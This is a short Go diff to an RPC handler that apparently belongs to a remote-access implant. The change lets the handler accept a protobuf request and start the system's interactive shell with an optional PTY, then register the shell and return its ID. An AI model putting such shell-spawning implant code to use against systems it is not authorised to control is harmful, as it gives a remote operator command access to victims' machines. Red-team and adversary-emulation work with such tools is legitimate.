@@ -313,11 +313,18 @@ func dumpHandler(data []byte, resp RPCResponse) {
 }
 
 func startShellHandler(data []byte, resp RPCResponse) {
-	shellPath := shell.GetSystemShellPath()
 
-	systemShell := shell.StartInteractive(shellPath)
+	shellReq := &pb.ShellReq{}
+	err := proto.Unmarshal(data, shellReq)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+
+	shellPath := shell.GetSystemShellPath()
+	systemShell := shell.StartInteractive(shellPath, shellReq.EnablePTY)
 	shell.Shells.AddShell(systemShell)
-	data, err := proto.Marshal(&pb.ShellData{
+	data, err = proto.Marshal(&pb.ShellData{
 		ID: systemShell.ID,
 	})
 	resp(data, err)
